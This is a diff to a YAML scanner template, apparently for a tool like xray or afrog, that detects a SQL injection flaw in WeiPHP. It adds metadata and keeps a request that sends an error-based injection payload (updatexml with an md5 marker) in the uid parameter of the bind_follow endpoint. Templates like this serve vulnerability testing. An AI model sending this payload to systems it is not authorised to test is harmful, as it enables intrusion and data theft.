@@ -1,16 +1,21 @@
 id: weiphp-sql
 
 info:
-    name: weiphp sql
-    author: sakura404x
-    severity: high
+  name: weiphp sql
+  author: sakura404x
+  severity: high
+  verified: false
+  description: |
+    Weiphp sql漏洞，攻击者可以利用该漏洞获取服务器敏感信息。
+  tags: weiphp,sql
+  created: 2025/03/13
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)--+
-        expression: response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
+  r0:
+    request:
+      method: GET
+      path: /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5({{rand}}),0x7e),1)--+
+    expression: response.body.bcontains(bytes(substr(md5(string(rand)), 0, 31)))
 expression: r0()
